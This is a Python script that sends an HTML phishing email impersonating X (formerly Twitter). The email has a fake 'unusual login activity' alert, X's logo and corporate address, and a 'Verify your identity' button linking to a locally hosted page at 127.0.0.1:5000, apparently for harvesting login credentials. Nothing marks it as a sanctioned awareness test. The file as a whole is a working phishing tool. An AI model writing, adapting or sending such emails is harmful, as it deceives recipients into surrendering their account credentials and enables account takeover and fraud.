import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart


# Email server details (for example, Gmail's SMTP)
smtp_server = "smtp.gmail.com"
smtp_port = 587
sender_email = "your_email@gmail.com"
sender_password = "your_app_password"
receiver_email = "recipient@gmail.com"


# HTML email content
subject = "Unusual login activity on your X account"
body = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>X Security Alert</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f7f9fa;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            background-color: #ffffff;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
        }
        .header {
            text-align: center;
            padding-bottom: 20px;
            border-bottom: 1px solid #e1e8ed;
        }
        .header svg {
            width: 40px;
            height: 40px;
        }
        .content {
            padding: 20px 0;
        }
        .content h2 {
            margin: 0 0 15px 0;
            font-size: 20px;
            color: #0f1419;
        }
        .content p {
            font-size: 15px;
            color: #536471;
            line-height: 1.5;
            margin: 10px 0;
        }
        .alert-box {
            background-color: #fef3cd;
            border: 1px solid #ffc107;
            border-radius: 8px;
            padding: 15px;
            margin: 20px 0;
        }
        .alert-box p {
            color: #856404;
            margin: 0;
        }
        .button {
            display: inline-block;
            background-color: #0f1419;
            color: white !important;
            text-decoration: none;
            padding: 14px 28px;
            border-radius: 9999px;
            font-size: 15px;
            font-weight: 700;
            text-align: center;
            margin: 20px 0;
        }
        .button:hover {
            background-color: #2f3336;
        }
        .details {
            background-color: #f7f9fa;
            border-radius: 8px;
            padding: 15px;
            margin: 20px 0;
        }
        .details p {
            margin: 5px 0;
            font-size: 14px;
        }
        .footer {
            text-align: center;
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #e1e8ed;
            font-size: 12px;
            color: #536471;
        }
        .footer a {
            color: #1d9bf0;
            text-decoration: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <svg viewBox="0 0 24 24" aria-hidden="true">
                <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path>
            </svg>
        </div>

        <div class="content">
            <h2>Unusual login activity detected</h2>

            <div class="alert-box">
                <p><strong>Security Alert:</strong> We noticed a login to your account from a new device or location.</p>
            </div>

            <p>Hi,</p>
            <p>We detected unusual activity on your X account. For your security, please verify your identity by logging in below.</p>

            <div class="details">
                <p><strong>Login details:</strong></p>
                <p>Location: Moscow, Russia</p>
                <p>Device: Chrome on Windows</p>
                <p>Time: Just now</p>
            </div>

            <p>If this was you, you can ignore this message. If you don't recognize this activity, please secure your account immediately.</p>

            <center>
                <a href="http://127.0.0.1:5000" class="button">Verify your identity</a>
            </center>

            <p style="font-size: 13px; color: #71767b;">If the button doesn't work, copy and paste this link into your browser:<br>
            http://127.0.0.1:5000</p>
        </div>

        <div class="footer">
            <p>This is an automated security message from X.</p>
            <p>X Corp., 1355 Market Street, Suite 900, San Francisco, CA 94103</p>
            <p><a href="#">Help Center</a> | <a href="#">Privacy Policy</a> | <a href="#">Terms of Service</a></p>
        </div>
    </div>
</body>
</html>
"""


# Set up the MIME
message = MIMEMultipart()
message["From"] = sender_email
message["To"] = receiver_email
message["Subject"] = subject


# Attach the body with the HTML content
message.attach(MIMEText(body, "html"))


# Send the email
try:
    # Establish a secure session with the server
    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()  # Secure the connection
    server.login(sender_email, sender_password)  # Log into the email server
    text = message.as_string()
    server.sendmail(sender_email, receiver_email, text)  # Send the email
    print("Email sent successfully!")
except Exception as e:
    print(f"Error sending email: {e}")
finally:
    server.quit()  # Close the connection
